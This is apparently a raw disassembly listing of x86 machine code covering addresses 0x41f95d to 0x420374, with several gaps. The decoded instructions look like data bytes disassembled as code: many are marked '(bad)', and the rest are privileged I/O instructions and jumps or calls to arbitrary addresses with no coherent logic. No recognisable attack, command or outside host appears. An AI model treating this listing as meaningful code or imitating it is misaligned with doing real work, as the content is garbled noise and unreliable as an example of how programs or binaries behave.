  41f95d:	sbb    ecx,DWORD PTR [eax+edi*8-0x6f]
  41f961:	stc    
  41f962:	mov    ebx,0x128b9ea3
  41f967:	jno    0x41f994
  41f969:	add    edx,edi
  41f96b:	scas   al,BYTE PTR es:[edi]
  41f96c:	xor    BYTE PTR cs:[ecx+0x37cefa8],al
  41f973:	jp     0x41f96d
  41f975:	lahf   
  41f976:	push   ebp
  41f977:	add    esp,DWORD PTR [esi]
  41f979:	inc    ebp
  41f97a:	add    BYTE PTR [esi-0x6b42074f],bl
  41f980:	(bad)  
  41f982:	(bad)  
  41f983:	sahf   
  41f984:	std    
  41f985:	xchg   esp,eax
  41f986:	dec    esi
  41f987:	jecxz  0x41f9fd
  41f989:	xor    edi,DWORD PTR [esi+ebp*8+0x161c6a47]
  41f990:	mov    ds:0x21ff4cc,al
  41f995:	jnp    0x41f97a
  41f997:	sti    
  41f998:	fnstsw WORD PTR [ecx+ebx*8-0x7a]
  41f99c:	(bad)  
  41f99d:	jg     0x41f9ea
  41f99f:	rol    ecx,cl
  41f9a1:	arpl   bx,di
  41f9a3:	mov    eax,ds:0x943f331a
  41f9a8:	pop    ss
  41f9a9:	outs   dx,BYTE PTR ds:[esi]
  41f9aa:	dec    edi
  41f9ab:	push   0x67d79f95
  41f9b0:	stc    
  41f9b1:	inc    esi
  41f9b2:	bound  ebx,QWORD PTR [eax+0x18cc07fc]
  41f9b8:	mov    ebx,0xd99e03a9
  41f9be:	dec    ebx
  41f9bf:	lahf   
  41f9c0:	lock inc esi
  41f9c2:	jnp    0x41fa2d
  41f9c4:	jle    0x41f9f7
  41f9c6:	mov    bh,BYTE PTR [esi+0x17]
  41f9c9:	(bad)
  41f9cc:	in     al,dx
  41f9cd:	mov    ds:0xbe5cf6e6,al
  41f9d2:	pushf  
  41f9d3:	sub    dl,BYTE PTR [eax+0x41]
  41f9d6:	rol    BYTE PTR [esi+0x2d],0x62
  41f9da:	jo     0x41fa59
  41f9dc:	jl     0x41fa27
  41f9de:	neg    BYTE PTR [ebx+0x58]
  41f9e1:	ror    BYTE PTR ds:0x73b082f4,1
  41f9e7:	int3   
  41f9e8:	rcl    cl,cl
  41f9ea:	icebp  
  41f9eb:	or     edi,esp
  41f9ed:	dec    edi
  41f9ee:	or     BYTE PTR [eax-0x212f5b6b],bl
  41f9f4:	lods   al,BYTE PTR ds:[esi]
  41f9f5:	retf   
  41f9f6:	ds mov cl,0xd2
  41f9f9:	imul   esi,DWORD PTR [edx+0x4dd99ef8],0xffffffc5
  41fa00:	not    DWORD PTR [edx]
  41fa02:	into   
  41fa03:	push   ebp
  41fa04:	pop    edi
  41fa05:	xchg   ebx,eax
  41fa06:	dec    ecx
  41fa07:	data16 cmp al,BYTE PTR [eax+0x50]
  41fa0b:	adc    ah,ch
  41fa0d:	dec    ebx
  41fa0e:	mov    al,ds:0x4a
	...
  41fa73:	add    BYTE PTR [edx],cl
  41fa75:	inc    ecx
  41fa76:	mov    bh,0xa1
  41fa78:	push   edi
  41fa7a:	push   ds
  41fa7b:	jmp    0x41faa0
  41fa7d:	push   edi
  41fa7e:	mov    ds:0x669fbe15,eax
  41fa83:	dec    ebx
  41fa84:	rcl    BYTE PTR [eax+0x1],1
  41fa87:	add    BYTE PTR [ecx+eax*1],al
  41fa8a:	add    BYTE PTR [eax],al
  41fa8c:	fwait
  41fa8d:	dec    ecx
  41fa8e:	sti    
  41fa8f:	mov    WORD PTR [esi+0x3c2fc09f],ss
  41fa95:	jge    0x41fa4f
  41fa97:	popa   
  41fa98:	cs pop eax
  41fa9a:	or     BYTE PTR [ecx+eiz*4+0x23e0b97],dl
  41faa1:	retf   0x2274
  41faa4:	test   dh,0x93
  41faa7:	xchg   esi,eax
  41faa8:	pushf  
  41faa9:	js     0x41fb1f
  41faab:	arpl   WORD PTR [eax],cx
  41faad:	bswap  esi
  41faaf:	inc    ebx
  41fab0:	mov    eax,0x29a295a3
  41fab5:	les    ebx,FWORD PTR [eax+0x19]
  41fab8:	add    eax,0x4d5b1500
  41fabd:	dec    ecx
  41fabe:	mov    bl,0xfa
  41fac0:	push   ebp
  41fac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fac2:	push   es
  41fac3:	sbb    bl,al
  41fac5:	mov    ah,0x22
  41fac7:	add    ch,ch
  41fac9:	lds    ebx,FWORD PTR [esi+0x50fd3496]
  41facf:	mov    dl,0xa
  41fad1:	xor    al,0x3f
  41fad3:	or     DWORD PTR [eax],ecx
  41fad5:	outs   dx,BYTE PTR ds:[esi]
  41fad6:	cmp    al,0x32
  41fad8:	retf   
  41fad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fada:	shl    bh,1
  41fadc:	cdq    
  41fadd:	or     dh,BYTE PTR [edx-0x5a1a02a0]
  41fae3:	popa   
  41fae4:	xchg   ebx,eax
  41fae5:	sbb    DWORD PTR [ebp-0x2ada655],0x7787e258
  41faef:	gs inc ecx
  41faf1:	aam    0x2a
  41faf3:	neg    bh
  41faf5:	push   edx
  41faf6:	adc    eax,0xa5d128fc
  41fafb:	mov    ?,WORD PTR [edx]
  41fafd:	les    edi,FWORD PTR [ebp+0x45d20a5b]
  41fb03:	mov    al,ah
  41fb05:	or     al,0x12
  41fb07:	fwait
  41fb08:	inc    ecx
  41fb09:	xchg   edx,eax
  41fb0a:	and    al,al
  41fb0c:	cwde   
  41fb0d:	adc    esi,DWORD PTR [edi]
  41fb0f:	into   
  41fb10:	cmp    esi,edx
  41fb12:	mov    cl,0xa4
  41fb14:	jg     0x41fb15
  41fb16:	cwde   
  41fb17:	dec    ebp
  41fb18:	scas   eax,DWORD PTR es:[edi]
  41fb19:	mov    DWORD PTR [esi+0x36],esi
  41fb1c:	leave  
  41fb1d:	inc    edi
  41fb1e:	aam    0xc6
  41fb20:	test   eax,0x2ce1ba34
  41fb25:	in     al,0x6
  41fb27:	loope  0x41fb40
  41fb29:	jnp    0x41fb91
  41fb2b:	hlt    
  41fb2c:	rcl    DWORD PTR [esi],0x29
  41fb2f:	mov    bh,0x6f
  41fb31:	mov    ds:0xb2c13733,al
  41fb36:	sbb    BYTE PTR es:[ecx+0x1c37934],dl
  41fb3d:	xchg   bp,ax
  41fb3f:	test   al,0x6a
  41fb41:	int    0x53
  41fb43:	add    al,0x2b
  41fb45:	imul   esp,DWORD PTR [esi-0x520684c5],0xa82c262f
  41fb4f:	cmp    eax,0xe210c8f2
  41fb54:	sub    al,0x29
  41fb56:	push   0xffffff87
  41fb58:	ret    
  41fb59:	pop    esp
  41fb5a:	outs   dx,DWORD PTR gs:[esi]
  41fb5c:	sbb    DWORD PTR [edi],edx
  41fb5e:	mov    al,ds:0x49324c9b
  41fb63:	push   ebx
  41fb64:	inc    edi
  41fb65:	adc    cl,dh
  41fb67:	sbb    eax,0xfbf21319
  41fb6c:	neg    BYTE PTR [ebx-0x69]
  41fb6f:	aaa    
  41fb70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb71:	loopne 0x41fb0a
  41fb73:	push   edi
  41fb74:	pop    edx
  41fb75:	or     DWORD PTR [edx+0x38],esi
  41fb78:	mov    ecx,0xff25dd94
  41fb7d:	ins    BYTE PTR es:[edi],dx
  41fb7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb7f:	mov    ecx,0x73a5d10d
  41fb84:	in     al,0xbb
  41fb86:	mov    ebx,0x69329694
  41fb8b:	out    0x65,eax
  41fb8d:	add    eax,0xad01
	...
  41fbf2:	add    BYTE PTR [eax],al
  41fbf4:	fsubr  QWORD PTR [eax]
  41fbf6:	mov    ah,ah
  41fbf8:	(bad)  
  41fbf9:	out    0xfe,al
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	cmp    BYTE PTR [ebp+0x51d4e2ee],ch
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    al,0x1
  41fc0a:	add    BYTE PTR [eax],al
  41fc0c:	and    edi,DWORD PTR [edx]
  41fc0e:	mov    ebp,0xf3fa51e6
  41fc13:	sub    esi,ebp
  41fc15:	mov    ebx,0x6e8eec10
  41fc1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc1b:	repnz dec ebp
  41fc1d:	or     DWORD PTR [ebx-0x70],esp
  41fc20:	repz mov ebx,0x2eff4519
  41fc26:	jne    0x41fbe0
  41fc28:	aas    
  41fc29:	inc    edi
  41fc2a:	sbb    eax,0x2edfb0f8
  41fc2f:	fwait
  41fc30:	iret   
  41fc31:	popf   
  41fc32:	sbb    bl,bl
  41fc34:	mov    al,0x5c
  41fc36:	adc    al,0x4e
  41fc38:	sbb    DWORD PTR [eax],ebp
  41fc3a:	push   eax
  41fc3b:	(bad)  
  41fc3d:	loope  0x41fbf4
  41fc3f:	out    dx,eax
  41fc40:	adc    BYTE PTR [edx],0x6e
  41fc43:	jb     0x41fbe3
  41fc45:	push   esi
  41fc46:	lds    eax,FWORD PTR [edx+0x69938d13]
  41fc4c:	loop   0x41fc4f
  41fc4e:	push   esi
  41fc4f:	int3   
  41fc50:	or     al,0xc8
  41fc52:	cld    
  41fc53:	pusha  
  41fc54:	inc    edi
  41fc55:	imul   BYTE PTR [edx+0x5d]
  41fc58:	imul   esp,DWORD PTR [esi+0x393cc4d],0x6c
  41fc5f:	int3   
  41fc60:	mov    ds:0x74a74210,eax
  41fc65:	lods   eax,DWORD PTR ds:[esi]
  41fc66:	inc    esp
  41fc67:	sbb    eax,0x4d259138
  41fc6c:	xchg   ecx,eax
  41fc6d:	pop    esi
  41fc6e:	pop    edi
  41fc6f:	dec    esi
  41fc70:	ds in  al,0xcb
  41fc73:	int    0x74
  41fc75:	or     dl,BYTE PTR [edx-0x53]
  41fc78:	(bad)  
  41fc79:	and    esp,edi
  41fc7b:	cmp    BYTE PTR [esp+ecx*2+0x3c2e472a],ah
  41fc82:	inc    ebp
  41fc83:	or     eax,0xfe09bed6
  41fc88:	stc    
  41fc89:	sbb    eax,ebp
  41fc8b:	xlat   BYTE PTR ds:[ebx]
  41fc8c:	sbb    eax,0xd6ed02a1
  41fc91:	mov    esp,0x613d8afa
  41fc96:	icebp  
  41fc97:	mov    bh,0xcb
  41fc99:	push   esp
  41fc9a:	xchg   ebx,eax
  41fc9b:	fdivr  QWORD PTR [esi-0x4a]
  41fc9e:	xchg   edx,eax
  41fc9f:	outs   dx,BYTE PTR ds:[esi]
  41fca0:	mul    BYTE PTR [ecx+0x6d]
  41fca3:	ret    
  41fca4:	retf   
  41fca5:	or     DWORD PTR ds:0x1d56474,esi
  41fcab:	jp     0x41fd06
  41fcad:	(bad)  
  41fcae:	push   eax
  41fcaf:	lods   eax,DWORD PTR ds:[esi]
  41fcb1:	xor    BYTE PTR [edx],al
  41fcb3:	and    eax,0xd3bc3724
  41fcb8:	bound  eax,QWORD PTR [ebp+0x5b]
  41fcbb:	inc    eax
  41fcbc:	aas    
  41fcbd:	jmp    0x3976cbde
  41fcc2:	lods   al,BYTE PTR ds:[esi]
  41fcc3:	fsubr  DWORD PTR [eax+0x363c9c28]
  41fcc9:	and    esi,DWORD PTR [ebp-0x387e9523]
  41fccf:	int    0x25
  41fcd1:	sub    BYTE PTR [eax+eiz*2+0x40e8ff78],0x1d
  41fcd9:	push   esp
  41fcda:	cmp    cl,BYTE PTR [edi]
  41fcdc:	fsubp  st(7),st
  41fcde:	and    al,0x25
  41fce0:	in     eax,dx
  41fce1:	in     eax,dx
  41fce2:	sar    BYTE PTR [eax],0x48
  41fce5:	pushf  
  41fce6:	jmp    0x61392d9a
  41fceb:	xor    ch,bl
  41fced:	xor    eax,0xae81c8c0
  41fcf2:	jl     0x41fcca
  41fcf4:	mov    ebx,0x6c63a480
  41fcf9:	inc    ebp
  41fcfa:	mov    ecx,0xa5282ade
  41fcff:	add    eax,0xa0745012
  41fd04:	sub    edx,edx
  41fd06:	retf   
  41fd07:	stos   BYTE PTR es:[edi],al
  41fd08:	repnz and al,0xa2
  41fd0b:	inc    ebx
  41fd0c:	jno    0x41fce7
  41fd0e:	and    bl,cl
	...
  41fd74:	or     al,0x6a
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	in     al,dx
  41fd81:	js     0x41fd61
  41fd83:	pop    esp
  41fd84:	fcom   DWORD PTR [edx+0x1]
  41fd87:	add    BYTE PTR [ecx+eax*1],al
  41fd8a:	add    BYTE PTR [eax],al
  41fd8c:	outs   dx,BYTE PTR ds:[esi]
  41fd8d:	push   esp
  41fd8e:	cmp    ebp,DWORD PTR [ebx+0x5b]
  41fd91:	xchg   esi,esp
  41fd93:	in     al,0xcd
  41fd95:	les    esi,FWORD PTR ds:0x3fed36e4
  41fd9b:	xchg   ebx,eax
  41fd9c:	sub    al,0x90
  41fd9e:	add    al,0x1d
  41fda0:	mov    BYTE PTR [edi-0x1a],bl
  41fda3:	push   0x7a177479
  41fda8:	add    bh,BYTE PTR [edx+0x77]
  41fdab:	js     0x41fe17
  41fdad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdae:	outs   dx,DWORD PTR ds:[esi]
  41fdaf:	fcmovnbe st,st(6)
  41fdb1:	leave  
  41fdb2:	push   ds
  41fdb3:	ins    BYTE PTR es:[edi],dx
  41fdb4:	in     eax,0xad
  41fdb6:	repz int3 
  41fdb8:	jo     0x41fd82
  41fdba:	mov    esp,0x5f16a4b1
  41fdbf:	push   ebp
  41fdc0:	stos   DWORD PTR es:[edi],eax
  41fdc1:	sbb    al,0x33
  41fdc3:	ret    
  41fdc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdc5:	xchg   edi,eax
  41fdc6:	adc    bl,BYTE PTR [ebp+0x35]
  41fdc9:	mov    bh,0x43
  41fdcb:	xchg   edx,eax
  41fdcc:	xchg   DWORD PTR [eax+0x1a8f07b8],ecx
  41fdd2:	or     ah,BYTE PTR [ebx]
  41fdd4:	xchg   ebx,eax
  41fdd5:	imul   ebp,DWORD PTR [edx+esi*1+0x7c],0xffffffce
  41fdda:	mov    dh,0x6d
  41fddc:	ret    0xee77
  41fddf:	xchg   bh,dh
  41fde1:	jne    0x41fe5b
  41fde3:	sahf   
  41fde4:	mov    ds:0x8d8c276d,eax
  41fde9:	sar    DWORD PTR [edi+0x4a14a71f],0xb1
  41fdf0:	mov    WORD PTR ds:0x3b712928,ds
  41fdf6:	sub    eax,0xd2ea85f8
  41fdfb:	adc    BYTE PTR [eax-0x29e951d2],0x7c
  41fe02:	mov    bh,0xf
  41fe04:	or     eax,0x795c9501
  41fe09:	push   esp
  41fe0a:	ds leave 
  41fe0c:	into   
  41fe0d:	adc    DWORD PTR [ebp+0x532678c0],0xffffff91
  41fe14:	or     dh,dh
  41fe16:	hlt    
  41fe17:	pop    eax
  41fe18:	add    DWORD PTR fs:[edx-0x7dfcbe26],esi
  41fe1f:	nop
  41fe20:	inc    edx
  41fe21:	ret    0x7be5
  41fe24:	pop    ds
  41fe25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe26:	imul   ebp,DWORD PTR [eax],0x93e90d3f
  41fe2c:	jmp    0x5c46:0xbfe6bae9
  41fe33:	int    0xdd
  41fe35:	mov    dh,BYTE PTR [ebp+0x49]
  41fe38:	xchg   ebx,eax
  41fe39:	mov    BYTE PTR [ecx-0xaf4ab6b],dh
  41fe3f:	adc    DWORD PTR [ecx],esp
  41fe41:	xchg   esi,eax
  41fe42:	add    al,0x23
  41fe44:	dec    eax
  41fe45:	leave  
  41fe46:	jns    0x41fddf
  41fe48:	scas   al,BYTE PTR es:[edi]
  41fe49:	pushf  
  41fe4a:	fidivr DWORD PTR [edi]
  41fe4c:	inc    edx
  41fe4d:	fimul  DWORD PTR [edx]
  41fe4f:	add    ebp,eax
  41fe51:	cmp    dl,BYTE PTR [ebx+edi*1-0x39]
  41fe55:	xor    DWORD PTR [edx],0xd89a25b1
  41fe5b:	or     ah,BYTE PTR [ebx-0x4db23c14]
  41fe61:	pop    ds
  41fe62:	and    eax,0x7f706ac1
  41fe67:	jne    0x41fe7c
  41fe69:	out    dx,al
  41fe6a:	xchg   ebx,eax
  41fe6b:	mov    edx,ebp
  41fe6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe6e:	inc    eax
  41fe6f:	xchg   esi,eax
  41fe70:	mov    ss,WORD PTR [edx+edi*2]
  41fe73:	mov    ds:0xf51362b9,eax
  41fe78:	sbb    eax,0x800ae501
  41fe7d:	fstp   TBYTE PTR [edi+0x42e3e7d5]
  41fe83:	jne    0x41fef8
  41fe85:	or     al,0x96
  41fe87:	push   esp
  41fe88:	ins    BYTE PTR es:[edi],dx
  41fe89:	gs test eax,0x137d41c6
  41fe8f:	mov    al,BYTE PTR [eax]
	...
  41fef1:	add    BYTE PTR [eax],al
  41fef3:	add    BYTE PTR [edx-0x1865ab],ch
  41fef9:	out    dx,eax
  41fefa:	call   FWORD PTR [ebp-0x5]
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0xea
  41ff01:	xor    eax,0x53dcedc3
  41ff06:	add    DWORD PTR [eax],eax
  41ff08:	add    al,0x1
  41ff0a:	add    BYTE PTR [eax],al
  41ff0c:	lds    esp,FWORD PTR [ebx]
  41ff0e:	in     al,dx
  41ff0f:	mov    ah,0x8
  41ff11:	lea    edi,[eax+0x79d8d13]
  41ff17:	push   esi
  41ff18:	lock xchg DWORD PTR [esi+0x342da4c6],edx
  41ff1f:	(bad)  
  41ff20:	sbb    al,0xac
  41ff22:	mov    ecx,0xfeb1c2a4
  41ff27:	and    eax,0x167a6c25
  41ff2c:	cmp    ebx,ebx
  41ff2e:	cmp    DWORD PTR [edi],edx
  41ff30:	mov    eax,ds:0x5a95eed5
  41ff35:	push   DWORD PTR [edi]
  41ff37:	mov    al,0x51
  41ff39:	stc    
  41ff3a:	out    dx,eax
  41ff3b:	ds and eax,0x14b868d6
  41ff41:	arpl   WORD PTR [ecx-0x760c6250],bx
  41ff47:	mov    eax,ds:0x31b4527e
  41ff4c:	xor    al,0x65
  41ff4e:	imul   ebx,DWORD PTR [ecx],0x14
  41ff51:	arpl   WORD PTR [edx],dx
  41ff53:	test   BYTE PTR [ecx],0xae
  41ff56:	cmp    bh,BYTE PTR [edi*2-0x26779082]
  41ff5d:	add    DWORD PTR [edi+0x6c7afc7f],0xbfae71a7
  41ff67:	sar    DWORD PTR [ecx],0x9c
  41ff6a:	out    dx,eax
  41ff6b:	mov    cl,ch
  41ff6d:	pop    ebx
  41ff6e:	out    dx,eax
  41ff6f:	shl    ecx,cl
  41ff71:	js     0x41ff89
  41ff73:	ret    0x4ae9
  41ff76:	add    bh,bl
  41ff78:	lods   al,BYTE PTR ds:[esi]
  41ff79:	jmp    0x99191a7e
  41ff7e:	bound  esi,QWORD PTR [edx-0xf]
  41ff81:	fs sbb al,0x50
  41ff84:	mov    al,ds:0x49e49b63
  41ff89:	cwde   
  41ff8a:	dec    ebp
  41ff8b:	cmp    BYTE PTR [eax-0x4],ah
  41ff8e:	in     eax,dx
  41ff8f:	les    ebx,FWORD PTR [eax-0x1e2ac5e7]
  41ff95:	mov    ah,0x84
  41ff97:	cmp    DWORD PTR ds:0x390bf6c8,esi
  41ff9d:	sub    DWORD PTR [eax+0x70],ebx
  41ffa0:	and    BYTE PTR ds:0xf28fa962,ch
  41ffa6:	fdiv   DWORD PTR [edx+0x48]
  41ffa9:	dec    ebx
  41ffaa:	je     0x41ff7d
  41ffac:	sub    al,0xc6
  41ffae:	cmp    ebp,DWORD PTR [edx]
  41ffb0:	mov    WORD PTR ds:0x6f118016,es
  41ffb6:	dec    edx
  41ffb7:	inc    DWORD PTR [ebp-0x29]
  41ffba:	or     BYTE PTR [edx-0x4493bbaf],bh
  41ffc0:	sbb    bl,BYTE PTR [ebx+0x2afef59a]
  41ffc6:	(bad)  
  41ffc7:	adc    dh,ch
  41ffc9:	dec    edi
  41ffca:	sahf   
  41ffcb:	push   0xffffff98
  41ffcd:	popa   
  41ffce:	ss jne 0x41ffc4
  41ffd1:	iret   
  41ffd2:	data16 sahf 
  41ffd4:	pop    ebx
  41ffd5:	repz inc ebx
  41ffd7:	jecxz  0x420029
  41ffd9:	lds    esi,FWORD PTR [ebp+0x2568b1f6]
  41ffdf:	popf   
  41ffe0:	push   eax
  41ffe1:	scas   eax,DWORD PTR es:[edi]
  41ffe2:	jmp    0x41ff86
  41ffe4:	sub    bh,BYTE PTR [edx-0x1c]
  41ffe7:	jp     0x420008
  41ffe9:	in     eax,dx
  41ffea:	shl    BYTE PTR [ebx-0x3d],1
  41ffed:	cmp    dh,dh
  41ffef:	mov    ebx,0x76bc081c
  41fff4:	xor    bh,ch
  41fff6:	or     eax,0xd173dd7
  41fffb:	cmp    BYTE PTR [ecx],bl
  41fffd:	mov    bh,0x97
  41ffff:	fs sbb eax,0x8a0ddfa4
  420005:	shl    BYTE PTR [eax],1
  420007:	daa    
  420008:	je     0x420001
  42000a:	jno    0x420048
  42000c:	test   eax,0x925bcb
	...
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [edx-0x5b],ah
  420076:	jbe    0x4200f7
  420078:	idiv   edi
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffffc2
  420081:	or     eax,0x54e07f9c
  420086:	add    DWORD PTR [eax],eax
  420088:	add    al,0x1
  42008a:	add    BYTE PTR [eax],al
  42008c:	jbe    0x4200ed
  42008e:	mov    bl,0x4e
  420090:	mov    bh,0xdf
  420092:	mov    esi,0x9343a609
  420097:	sbb    esi,DWORD PTR [ebx+0x35]
  42009a:	in     eax,dx
  42009b:	lahf   
  42009c:	aad    0xd4
  42009e:	inc    ebx
  42009f:	mov    esi,0x64ac8ac5
  4200a4:	loope  0x42007e
  4200a6:	jecxz  0x4200b2
  4200a8:	jg     0x420066
  4200aa:	lock loopne 0x4200fd
  4200ad:	mov    esp,0xa6370489
  4200b2:	inc    ebp
  4200b3:	icebp  
  4200b4:	lods   eax,DWORD PTR ds:[esi]
  4200b5:	xchg   edi,eax
  4200b6:	adc    BYTE PTR [ebx+0x6d],al
  4200b9:	push   esi
  4200ba:	and    BYTE PTR [ecx],bh
  4200bc:	imul   eax,DWORD PTR [eax+edi*4+0x34],0x24
  4200c1:	clc    
  4200c2:	out    dx,al
  4200c3:	pushf  
  4200c4:	sbb    DWORD PTR [ebx-0x42],ebx
  4200c7:	push   esi
  4200c8:	add    bl,BYTE PTR [edx]
  4200ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200cb:	pusha  
  4200cc:	cmp    eax,0x4b1e4535
  4200d1:	(bad)  
  4200d2:	std    
  4200d3:	imul   esi,DWORD PTR [eax],0x81ecd4d1
  4200d9:	xor    edi,ebp
  4200db:	outs   dx,BYTE PTR ds:[esi]
  4200dc:	ret    
  4200dd:	cmp    eax,0xa9c459c8
  4200e2:	repz mov cl,0x6a
  4200e5:	push   0xffffff8c
  4200e7:	mov    esp,0xc47e74fd
  4200ec:	sar    BYTE PTR ds:0x7d420d3d,cl
  4200f2:	rcr    eax,1
  4200f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200f5:	repnz mov gs,edi
  4200f8:	adc    edx,ecx
  4200fa:	fcomp  st(6)
  4200fc:	dec    ecx
  4200fd:	lods   al,BYTE PTR ds:[esi]
  4200fe:	adc    DWORD PTR [ecx],ebx
  420100:	shr    BYTE PTR [eax],0x70
  420103:	inc    DWORD PTR [edi+0xd]
  420106:	ins    DWORD PTR es:[edi],dx
  420107:	in     eax,0xb8
  420109:	call   0xc2f0:0x3e2f0ebc
  420110:	dec    edx
  420111:	pop    edi
  420112:	test   DWORD PTR [ecx+esi*8-0x25],0x54ee5b64
  42011a:	sbb    ch,BYTE PTR [ebx+eax*1+0x7e16dc76]
  420121:	test   BYTE PTR [ebx+0x34],cl
  420124:	mov    ecx,0xcbaef912
  420129:	mov    bh,0xf2
  42012b:	cld    
  42012c:	xlat   BYTE PTR ds:[ebx]
  42012d:	call   0xc51997eb
  420132:	stos   BYTE PTR es:[edi],al
  420133:	lahf   
  420134:	call   0xf7e1:0x1b888132
  42013b:	or     DWORD PTR [ebp+0xf2217b2],edx
  420141:	call   0xde1a2f9f
  420146:	mov    ds:0x1a9fa04c,al
  42014b:	mov    edx,0x950d9267
  420150:	outs   dx,DWORD PTR ds:[esi]
  420151:	push   esp
  420152:	add    eax,0x131ed451
  420157:	imul   esp,DWORD PTR [edx-0x921f091],0x16
  42015e:	xor    esp,DWORD PTR [eax-0x7d]
  420161:	xchg   ebp,eax
  420162:	iret   
  420163:	retf   
  420164:	mov    ds:0xd767cbd5,al
  420169:	mov    es,WORD PTR [eax-0x1c8eb8e9]
  42016f:	inc    ecx
  420170:	mov    ds:0x297ed7d9,eax
  420175:	pop    eax
  420176:	jg     0x420106
  420178:	rcl    DWORD PTR [ecx-0x893d98a],0x7
  42017f:	js     0x42018c
  420181:	mov    bh,0xcc
  420183:	xor    al,0xae
  420185:	and    esp,DWORD PTR [ebx-0x9]
  420188:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420189:	adc    al,0xd0
  42018b:	cld    
  42018c:	cli    
  42018d:	gs and ecx,edi
	...
  4201f4:	jae    0x4201c5
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx+0x1cecf5],1
  420204:	in     al,0x55
  420206:	add    DWORD PTR [eax],eax
  420208:	add    al,0x1
  42020a:	add    BYTE PTR [eax],al
  42020c:	sub    edi,0xffffff9c
  42020f:	push   edx
  420210:	mov    ss,esp
  420212:	jmp    0x4e29:0x24121b23
  420219:	repz scas eax,DWORD PTR es:[edi]
  42021b:	enter  0x71cd,0x12
  42021f:	sub    cl,BYTE PTR ds:0xc9944288
  420225:	add    bh,BYTE PTR [esi-0x31]
  420228:	and    BYTE PTR [ecx+0x181a3aee],ch
  42022e:	jbe    0x42028e
  420230:	inc    ecx
  420231:	in     eax,dx
  420232:	int    0x48
  420234:	inc    ecx
  420235:	fild   QWORD PTR ds:0xd048bffc
  42023b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42023c:	daa    
  42023d:	out    dx,eax
  42023e:	jle    0x4201e2
  420240:	aam    0x71
  420242:	pop    ds
  420243:	xor    ebp,DWORD PTR [eax]
  420245:	loop   0x42020e
  420247:	or     DWORD PTR [eax],ebp
  420249:	push   esi
  42024a:	or     DWORD PTR [esi-0x35],ecx
  42024d:	sub    esp,DWORD PTR [edx-0x79]
  420250:	lds    eax,FWORD PTR [esi+0x10d232d8]
  420256:	loope  0x420211
  420258:	jmp    0x42020e
  42025a:	jae    0x4202bd
  42025c:	push   ss
  42025d:	dec    eax
  42025e:	mov    ch,0xe4
  420260:	in     eax,dx
  420261:	xchg   edi,eax
  420262:	or     bh,BYTE PTR [edi+0x17]
  420265:	or     DWORD PTR [edx-0x5ba35208],edi
  42026b:	pop    ebx
  42026c:	std    
  42026d:	ret    
  42026e:	div    DWORD PTR [edi-0x4eaa5290]
  420274:	or     esp,DWORD PTR [ebp-0x53]
  420277:	mov    ah,0xb8
  420279:	stos   BYTE PTR es:[edi],al
  42027a:	jmp    0xa46bc4bc
  42027f:	imul   ecx,DWORD PTR [eax+0x61],0x3a
  420283:	leave  
  420284:	mov    dh,0xdc
  420286:	imul   esp,DWORD PTR [eax],0x14dfabab
  42028c:	(bad)  
  42028d:	mov    esi,0xa267e4a8
  420292:	jne    0x420294
  420294:	pop    ss
  420295:	sbb    al,0x60
  420297:	pop    ds
  420298:	test   eax,0xfdf8ec56
  42029d:	add    edx,DWORD PTR [edx-0x35b90259]
  4202a3:	mov    al,0xa3
  4202a5:	mov    ch,BYTE PTR [ebp-0x21]
  4202a8:	aam    0x1a
  4202aa:	pop    es
  4202ab:	add    DWORD PTR [esi],esp
  4202ad:	gs mov esi,0x5bcb7362
  4202b3:	aaa    
  4202b4:	es pushf 
  4202b6:	jne    0x4202f6
  4202b8:	sbb    al,0x76
  4202ba:	dec    edi
  4202bb:	loop   0x420328
  4202bd:	popa   
  4202be:	and    ebx,DWORD PTR [ecx+edx*8+0x1fc3fcc7]
  4202c5:	dec    ecx
  4202c6:	xchg   esi,eax
  4202c7:	or     DWORD PTR [ecx],edi
  4202c9:	inc    esi
  4202ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202cb:	sbb    ah,BYTE PTR [ebx-0x38]
  4202ce:	fisubr DWORD PTR [ecx+eax*1]
  4202d1:	leave  
  4202d2:	aam    0xfd
  4202d4:	std    
  4202d5:	sbb    eax,0xff18a4c2
  4202da:	mov    ebx,0x30c43634
  4202df:	pop    ebx
  4202e0:	pusha  
  4202e1:	mov    al,0x7a
  4202e3:	inc    ebx
  4202e4:	ss cdq 
  4202e6:	add    BYTE PTR [ebx],bl
  4202e8:	sbb    esi,0xd
  4202eb:	(bad)  
  4202ec:	(bad)  
  4202ee:	lea    edi,[ecx-0x6592dede]
  4202f4:	fwait
  4202f5:	add    ch,0xd9
  4202f8:	stos   BYTE PTR es:[edi],al
  4202f9:	adc    ah,BYTE PTR [ebp+0x3d1cbc91]
  4202ff:	test   al,0xf0
  420301:	add    al,0xda
  420303:	mov    ds:0xb8a8846a,al
  420308:	retf   0xe24f
  42030b:	push   ss
  42030c:	out    dx,eax
  42030d:	int3   
  42030e:	adc    eax,esp
	...
  420374:	inc    ecx
